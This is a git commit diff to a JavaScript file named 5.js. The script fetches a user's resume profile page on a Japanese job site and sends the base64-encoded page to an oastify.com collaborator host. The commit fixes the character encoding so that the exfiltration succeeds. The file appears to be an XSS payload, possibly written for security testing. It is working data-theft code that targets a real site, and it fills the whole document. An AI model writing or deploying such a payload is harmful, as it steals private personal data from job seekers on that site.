1d1fb4b1196c97d627172150acd6e6307478fbd1
huynhvanphuc <phucdelete@gmail.com>
2024-07-30 15:29:09 +0700

    Update 5.js

--- assets/js/5.js
+++ assets/js/5.js
@@ -3,9 +3,16 @@ xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
 xhr.send(null);
 
 if (xhr.status === 200) { // Check if the request was successful
-    var exfil = new XMLHttpRequest();
-    var encodedResponse = encodeURIComponent(btoa(xhr.responseText));
-    var exfilUrl = "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + encodedResponse;
-    exfil.open("GET", exfilUrl, false);
-    exfil.send();
+    var responseText = xhr.responseText;
+    
+    // Ensure proper encoding of the response
+    try {
+        var encodedResponse = encodeURIComponent(btoa(unescape(encodeURIComponent(responseText))));
+        var exfilUrl = "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + encodedResponse;
+        var exfil = new XMLHttpRequest();
+        exfil.open("GET", exfilUrl, false);
+        exfil.send();
+    } catch (e) {
+        console.error("Encoding failed: ", e);
+    }
 }
